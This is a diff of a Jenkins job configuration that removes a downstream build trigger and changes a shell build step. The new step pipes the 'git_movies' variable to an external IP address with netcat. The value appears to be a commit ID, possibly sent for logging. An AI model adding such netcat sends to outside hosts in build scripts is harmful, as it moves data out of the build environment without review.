@@ -54,28 +54,7 @@
   <settings class="jenkins.mvn.DefaultSettingsProvider"/>
   <globalSettings class="jenkins.mvn.DefaultGlobalSettingsProvider"/>
   <reporters/>
-  <publishers>
-    <hudson.plugins.parameterizedtrigger.BuildTrigger plugin="parameterized-trigger@2.29">
-      <configs>
-        <hudson.plugins.parameterizedtrigger.BuildTriggerConfig>
-          <configs>
-            <hudson.plugins.parameterizedtrigger.PredefinedBuildParameters>
-              <properties>ACTORS_GIT_ID=$GIT_COMMIT
-MOVIES_GIT_ID=$git_movies
-SHOP_REST_GIT_ID=latest
-SHOP_APP_GIT_ID=$git_shop_app
-NAVIGATION_GIT_ID=latest
-MONITORING_GIT_ID=latest
-RELEASE_ID=4712</properties>
-            </hudson.plugins.parameterizedtrigger.PredefinedBuildParameters>
-          </configs>
-          <projects>tstage</projects>
-          <condition>SUCCESS</condition>
-          <triggerWithNoParameters>false</triggerWithNoParameters>
-        </hudson.plugins.parameterizedtrigger.BuildTriggerConfig>
-      </configs>
-    </hudson.plugins.parameterizedtrigger.BuildTrigger>
-  </publishers>
+  <publishers/>
   <buildWrappers>
     <org.jenkinsci.plugins.credentialsbinding.impl.SecretBuildWrapper plugin="credentials-binding@1.6">
       <bindings>
@@ -107,8 +86,7 @@ sudo echo &quot;git_shop_app=$(git log | head -1 | sed s/&apos;commit &apos;//)&
       </info>
     </EnvInjectBuilder>
     <hudson.tasks.Shell>
-      <command>echo &quot;git_movies&quot;
-echo $git_movies
+      <command>echo git_movies: $git_movies | nc 52.29.31.102 5000 
 echo &quot;git_shop_app&quot;
 echo $git_shop_app
 cd Jenkins
